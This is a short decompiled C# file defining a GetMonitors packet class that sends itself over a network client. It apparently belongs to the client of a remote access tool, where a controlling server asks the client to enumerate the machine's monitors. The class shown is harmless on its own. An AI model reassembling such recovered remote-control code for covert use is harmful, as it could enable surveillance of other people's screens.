using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
	// Token: 0x0200009B RID: 155
	[Serializable]
	public class GetMonitors : IPacket
	{
		// Token: 0x060003F6 RID: 1014 RVA: 0x00003FAB File Offset: 0x000021AB
		public void Execute(Client client)
		{
			client.Send<GetMonitors>(this);
		}
	}
}
